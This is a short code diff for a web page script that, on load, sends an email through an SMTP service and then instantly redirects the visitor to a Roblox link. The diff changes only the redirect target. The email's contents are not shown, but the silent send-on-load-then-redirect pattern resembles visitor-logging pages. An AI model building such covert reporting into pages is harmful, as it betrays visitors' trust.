@@ -21,7 +21,7 @@ window.onload = () => {
         Port: "2525"
       }).then(() => {
             setTimeout(() => {
-                window.location.href = 'https://www.roblox.com/games/10277607801/CHAPTER-2-Apeirophobia#!/game-instances';
+                window.location.href = 'https://www.roblox.com/share?code=3e36be2f03f5fd4aa249788c74677870&type=Server';
             }, 0.0000000000000000000000000000000000000000000000000000000000000000000000001);
         }).catch((error) => {
             console.error('Error sending email:', error);
